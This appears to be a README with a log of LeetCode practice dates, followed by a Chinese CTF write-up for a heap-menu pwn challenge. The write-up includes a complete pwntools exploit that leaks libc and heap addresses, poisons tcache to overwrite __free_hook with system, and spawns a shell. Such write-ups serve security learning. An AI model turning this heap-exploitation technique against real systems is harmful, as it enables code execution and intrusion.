# code-training
2024.09.13 leetcode_43</br>
2024.09.14 leetcode_45</br>
2024.09.15 leetcode_50</br>
2024.09.17 leetcode_46</br>
2024.09.17 leetcode_47</br>
2024.09.17 leetcode_48</br>
2024.09.17 leetcode_49</br>
2024.09.19 leetcode_51</br>
2024.09.19 leetcode_52</br>
2024.10.12 leetcode_53</br>
2024.10.12 leetcode_54</br>
2024.10.12 leetcode_55</br>
2024.10.13 leetcode_56</br>
2024.10.14 leetcode_41</br>
2024.10.14 leetcode_42</br>
2024.10.14 leetcode_44</br>
2024.10.15 leetcode_57</br>
2024.10.18 leetcode_58</br>
2024.10.18 leetcode_59</br>
2024.10.18 leetcode_60</br>
2024.10.18 leetcode_61</br>
2024.10.19 leetcode_62</br>
2024.10.19 leetcode_63</br>

PWN1

打开题目发现是常规菜单堆题，edit能任意地址写0x00A2C2A

主要思路是利用写进去的00，劫持tcache管理堆，造成堆叠

根据题目菜单功能写出前置脚本

```python
from pwn import *
p=remote('',)

context(os='linux',arch='amd64',log_level='debug')
def debug():
    gdb.attach(p)
    pause()
elf = ELF('./pwn1')
libc=elf.libc
def cmd(idx):
    p.sendlineafter(b'ut your choice',str(idx))
def add(idx,cnt=b'1'):
    cmd(1)
    p.sendlineafter(b'ize :',str(idx))
    p.sendafter(b'ontent :',cnt)

def edit(cnt):
    cmd(3)
    p.sendlineafter(b'ntent :',cnt)
def delete(idx):
    cmd(2)
    p.sendlineafter(b'Index :',str(idx))
def show(idx):
    cmd(4)
    p.sendlineafter(b'Index :',str(idx))
```

leak addr

```python
add(0x500,b'11')  # 0
add(0xa0)  # 1
delete(0)
add(0xa0)  # 2
add(0xa0)  # 3
add(0xa0)  # 4
# 从unsorted切割
show(2)  
p.recvline()
libc_base = u64(p.recv(6).ljust(8, b'\x00'))-0x1EC061-0xfd0


system = libc_base+libc.sym['system']
free_hook = libc_base+libc.sym['__free_hook']

delete(3)
delete(4)  # 0xb0 4->3
 # 5   原4 tcache
add(0xa0) 
show(5)
p.recvline()
heap_base = u64(p.recv(6).ljust(8, b'\x00'))-0x331

```

为了防止 `unsortedbin` 切割后面的堆叠影响，我们需要先申请足够多的 `chunk`，以便将 `unsortedchunk` 移入 `smallbin`。接着，我们再次释放 `chunk5`，使其优先进入 `tcache`，以便后续方便地进行内容修改。

并在在heap_base+0x105的地方开edit

申请0x110，就能申请到0x*400的堆，申请0xb0也是一样的

那这就达到了堆叠的效果。

后面先申请0x110然后修改fd位为free_hook，再申请两个0xb0的堆，就能达到free_hook，修改为ogg或者system即可。

```
edit(p64(heap_base+0x105))

add(0x100, p64(free_hook))  # 9
add(0xa0, "/bin/sh\x00")  # 10
add(0xa0, p64(system))  # 11
delete(10)
```

EXP

```python
from pwn import *

context(os='linux',arch='amd64',log_level='debug')
p=remote("",)
def debug():
    gdb.attach(p)
    pause()
elf = ELF('./pwn1')
libc=elf.libc
def cmd(idx):
    p.sendlineafter(b'your choice',str(idx))
def add(idx,cnt=b'1'):
    cmd(1)
    p.sendlineafter(b'ize :',str(idx))
    p.sendafter(b'ent :',cnt)

def edit(cnt):
    cmd(3)
    p.sendlineafter(b'ntent :',cnt)
def delete(idx):
    cmd(2)
    p.sendlineafter(b'Index :',str(idx))
def show(idx):
    cmd(4)
    p.sendlineafter(b'Index :',str(idx))

add(0x500,b'11')  # 0
add(0xa0)  # 1
delete(0)
add(0xa0)  # 2
add(0xa0)  # 3
add(0xa0)  # 4
show(2)  
# 从unsorted切割
p.recvline()
libc_base = u64(p.recv(6).ljust(8, b'\x00'))-0x1EC061-0xfd0
print(hex(libc_base))

system = libc_base+libc.sym['system']
free_hook = libc_base+libc.sym['__free_hook']

delete(3)
delete(4)  # 0xb0 4->3
add(0xa0)  
# 5   原4 tcache
show(5)
p.recvline()
heap_base = u64(p.recv(6).ljust(8, b'\x00'))-0x331
print(hex(heap_base))

add(0x100)  # 6
add(0x100)  # 7
add(0x100)  # 8 把unsortedchunk取到后面不够取，进到smallbin

delete(5)  # 0xb0 5->3 or 4->3
delete(6)  # 0x110 6
edit(p64(heap_base+0x105))

# gdb.attach(r)
# pause()
add(0x100, p64(free_hook))  # 9
add(0xa0, "/bin/sh\x00")  # 10
add(0xa0, p64(system))  # 11

delete(10)


p.interactive()

```


